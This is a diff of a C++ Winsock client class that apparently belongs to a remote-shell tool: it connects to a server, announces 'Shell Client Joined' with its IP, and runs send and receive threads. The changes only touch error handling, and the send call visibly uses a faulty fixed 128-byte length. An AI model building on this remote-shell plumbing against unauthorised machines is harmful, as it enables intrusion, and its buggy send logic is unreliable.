@@ -3,8 +3,7 @@
 std::string ClientSocket::get_host_name() {
 	char hostname[20];
 	if (gethostname(hostname, sizeof(hostname)) == SOCKET_ERROR) {
-		std::cerr << "Error " << WSAGetLastError() <<
-			" when getting local host name." << std::endl;
+		std::cerr << "Error " << WSAGetLastError() << std::endl;
 	}
 	return hostname;
 }
@@ -31,7 +30,7 @@ void ClientSocket::connect_server() {
 	{
 		printf("Failed to connect.\n");
 		WSACleanup();
-		exit(0);
+		return;
 	}
 	send(this->main_socket, this->header.c_str(), header.size() + 1 != 128 ? 128 : header.size() + 1, 1);
 }
@@ -41,13 +40,15 @@ ClientSocket::ClientSocket(std::string ip, int port) {
 	this->port = port;
 
 	int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
-	if (result != NO_ERROR)
+	if (result != NO_ERROR) {
 		printf("Initialization error.\n");
+		return;
+	}
 
 	this->main_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-	if (this->main_socket == INVALID_SOCKET)
-	{
+	if (this->main_socket == INVALID_SOCKET) {
 		printf("Error creating socket: %ld\n", WSAGetLastError());
+		return;
 	}
 	std::string ip_s = get_address();
 	std::string header = "Shell Client Joined ---- IP: " + ip_s;
@@ -104,5 +105,4 @@ void ClientSocket::client_loop() {
 	std::thread send_thr(send_command, this->main_socket);
 	receive_thr.join();
 	send_thr.join();
-
 }
